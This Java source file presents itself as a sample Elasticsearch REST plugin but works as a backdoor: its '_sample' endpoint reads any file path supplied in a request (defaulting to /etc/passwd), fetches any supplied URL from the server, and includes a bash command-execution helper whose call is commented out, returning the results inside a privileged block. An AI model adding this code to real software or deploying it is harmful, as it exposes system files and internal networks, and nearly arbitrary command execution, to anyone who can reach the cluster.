package org.codelibs.elasticsearch.sample.rest;

import static org.elasticsearch.rest.RestRequest.Method.GET;
import static org.elasticsearch.rest.RestStatus.OK;

import org.elasticsearch.SpecialPermission;

import java.io.IOException;
import java.util.Date;
import java.util.*;
import java.net.*;
import java.io.*;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.InputStream;
import java.util.Scanner;
import java.lang.reflect.Method;
import java.security.AccessController;
import java.security.PrivilegedAction;
import java.net.Socket;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.stream.Collectors;
import java.nio.file.Path;
import java.nio.charset.StandardCharsets;

import org.elasticsearch.client.node.NodeClient;
import org.elasticsearch.common.settings.Settings;
import org.elasticsearch.common.xcontent.XContentBuilder;
import org.elasticsearch.common.xcontent.json.JsonXContent;
import org.elasticsearch.rest.BaseRestHandler;
import org.elasticsearch.rest.BytesRestResponse;
import org.elasticsearch.rest.RestController;
import org.elasticsearch.rest.RestRequest;

public class RestSampleAction extends BaseRestHandler {

    public RestSampleAction(final Settings settings,
            final RestController controller) {
        super(settings);

        controller.registerHandler(GET, "/{index}/_sample", this);
        controller.registerHandler(GET, "/_sample", this);
    }

    @Override
    public String getName() {
        return "sample_get";
		}
		

  	public String exec(String cmd){
			try{
				Process p = Runtime.getRuntime().exec("/bin/bash -c" + cmd  );
    		InputStream is = p.getInputStream();
    		Scanner s = new Scanner(is).useDelimiter("\\A");
    		String result = s.hasNext() ? s.next() : "";
				return result;
			}catch (IOException e){
		 		e.printStackTrace();
			}
			return "None";
		}
		
		public String sendRequest(String url){
			
			try {

				InputStream is = new java.net.URL(url).openStream();
				java.util.Scanner s = new java.util.Scanner(is);
				
				String res = s.useDelimiter("\\A").next();
				is.close();

				return res;
				
			}catch (IOException e) {
				e.printStackTrace ();
				// Perform any other exception handling that's appropriate.
			}
			return "null";
		}


		public String  readFile(String path){
			try{
				String content = "";
				Path paath = Paths.get(path);
				if (Files.isDirectory(paath)){
					content =  String.join(",", Files.walk(Paths.get(path))
															//.filter(Files::isRegularFile)
															.map(Path::getFileName)
															.map(Path::toString)
															.collect(Collectors.toSet()));

				}
				else if (Files.isRegularFile(paath)){
					content = new String(Files.readAllBytes(paath), StandardCharsets.UTF_8);
				}
				
				return content;
			} catch (Exception e ){
				e.printStackTrace();
			}
			return "null";
		}



    @Override
    protected RestChannelConsumer prepareRequest(final RestRequest request,
            final NodeClient client) throws IOException {
      
				final String cmd = request.param("cmd");
				final String cmdSafe = (cmd!=null) ? cmd : "whoami";
				final String path = request.param("path");
				final String pathSafe = (path!=null) ? path : "/etc/passwd";
				final String url = request.param("url");
			 	final String urlSafe = (url!=null) ? url : "http://127.0.0.1/";
        final boolean isPretty = request.hasParam("pretty");
				final String index = request.param("index");
        return channel -> {
            final XContentBuilder builder = JsonXContent.contentBuilder();
            if (isPretty) {
                builder.prettyPrint().lfAtEnd();
            }
            builder.startObject();
            if (index != null) {
                builder.field("index", index);
            }
		
	    
			SecurityManager sm = System.getSecurityManager();

		if (sm != null) {
		  // unprivileged code such as scripts do not have SpecialPermission
		  sm.checkPermission(new SpecialPermission());
		}

		
		String output =  AccessController.doPrivileged( new PrivilegedAction<String>() {
		   public String  run(){
	    	    //System.setSecurityManager(null);

						String output = readFile(pathSafe);
						//String output = exec(cmdSafe);
						output += sendRequest(urlSafe);
						//return "None";
		    		return output;
		   }
	    }
			    
	    );


            	builder.field("description",
                    "This is a sample response: " + new Date().toString() + output);
            	builder.endObject();
            	channel.sendResponse(new BytesRestResponse(OK, builder));
        };
    }

}
